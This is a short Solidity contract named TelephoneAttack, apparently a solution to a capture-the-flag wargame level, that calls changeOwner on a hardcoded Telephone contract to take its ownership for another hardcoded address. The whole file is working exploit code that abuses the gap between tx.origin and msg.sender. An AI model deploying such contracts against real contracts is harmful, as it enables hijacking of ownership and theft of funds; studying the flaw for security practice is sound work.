// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract TelephoneAttack {
ITelephone public telephone = ITelephone(0xF380bC8b4e595dECa3A55A4C98A6C4fA1c96f537);
  

  

  function attack() external {
    telephone.changeOwner(0xbDA5747bFD65F08deb54cb465eB87D40e51B197E);
  }
}